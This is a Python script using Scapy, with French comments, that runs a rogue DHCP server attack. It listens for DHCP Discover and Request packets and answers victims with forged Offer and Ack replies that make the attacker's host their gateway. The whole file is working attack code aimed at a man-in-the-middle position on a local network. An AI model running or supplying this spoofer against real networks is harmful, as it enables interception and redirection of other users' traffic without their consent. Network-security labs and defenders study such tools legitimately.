from scapy.all import *
from scapy.layers.dhcp import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

# Configuration de l'attaque
FAKE_DHCP_SERVER_IP = "10.1.1.100"  # IP du faux serveur DHCP (attaquant)
FAKE_IP_OFFERED = "10.1.1.37"  # IP que l'on attribue à la victime
FAKE_SUBNET = "255.255.255.0"
FAKE_ROUTER = "10.1.1.100"
FAKE_DNS = "1.1.1.1"
INTERFACE = "enp0s8"  # Interface réseau sur laquelle écouter et répondre

victim_mac_ip_map = {}  # Stocke les IP attribuées pour chaque victime

def handle_dhcp_packet(pkt):
    """ Capture et répond aux paquets DHCP Discover et Request """
    if pkt.haslayer(DHCP):
        mac_victime = pkt[Ether].src
        xid = pkt[BOOTP].xid  # ID de transaction du client

        # Si la victime envoie un DHCP Discover
        if pkt[DHCP].options[0][1] == 1:  # Message Type = Discover
            print(f"[+] DHCP Discover détecté de {mac_victime}")

            # Création du DHCP Offer
            dhcp_offer = Ether(dst=mac_victime, src=get_if_hwaddr(INTERFACE)) / \
                         IP(src=FAKE_DHCP_SERVER_IP, dst="255.255.255.255") / \
                         UDP(sport=67, dport=68) / \
                         BOOTP(op=2, yiaddr=FAKE_IP_OFFERED, siaddr=FAKE_DHCP_SERVER_IP,
                               chaddr=mac2str(mac_victime), xid=xid) / \
                         DHCP(options=[("message-type", "offer"),
                                       ("server_id", FAKE_DHCP_SERVER_IP),  # Identifiant du faux serveur DHCP
                                       ("subnet_mask", FAKE_SUBNET),
                                       ("router", FAKE_ROUTER),
                                       ("name_server", FAKE_DNS),
                                       ("lease_time", 3600),
                                       "end"])

            sendp(dhcp_offer, iface=INTERFACE, verbose=False)
            print(f"[+] DHCP Offer envoyé à {mac_victime}, IP attribuée : {FAKE_IP_OFFERED}")

            # Enregistrer l'IP attribuée pour cette victime
            victim_mac_ip_map[mac_victime] = FAKE_IP_OFFERED

        # Si la victime répond avec un DHCP Request
        elif pkt[DHCP].options[0][1] == 3:  # Message Type = Request
            if mac_victime in victim_mac_ip_map:  # Vérifie que l'IP a bien été attribuée avant
                print(f"[+] DHCP Request reçu de {mac_victime}, confirmation de l'IP : {FAKE_IP_OFFERED}")

                # Création du DHCP Ack
                dhcp_ack = Ether(dst=mac_victime, src=get_if_hwaddr(INTERFACE)) / \
                           IP(src=FAKE_DHCP_SERVER_IP, dst="255.255.255.255") / \
                           UDP(sport=67, dport=68) / \
                           BOOTP(op=2, yiaddr=FAKE_IP_OFFERED, siaddr=FAKE_DHCP_SERVER_IP,
                                 chaddr=mac2str(mac_victime), xid=xid) / \
                           DHCP(options=[("message-type", "ack"),
                                         ("server_id", FAKE_DHCP_SERVER_IP),
                                         ("subnet_mask", FAKE_SUBNET),
                                         ("router", FAKE_ROUTER),
                                         ("name_server", FAKE_DNS),
                                         ("lease_time", 3600),
                                         "end"])

                sendp(dhcp_ack, iface=INTERFACE, verbose=False)
                print(f"[+] DHCP Ack envoyé, IP {FAKE_IP_OFFERED} confirmée pour {mac_victime}")

def dhcp_spoof():
    """ Écoute les requêtes DHCP et répond avec des offres frauduleuses """
    print("[*] En attente de DHCP Discover...")
    sniff(filter="udp and (port 67 or port 68)", iface=INTERFACE, prn=handle_dhcp_packet, store=0)

if __name__ == "__main__":
    dhcp_spoof()
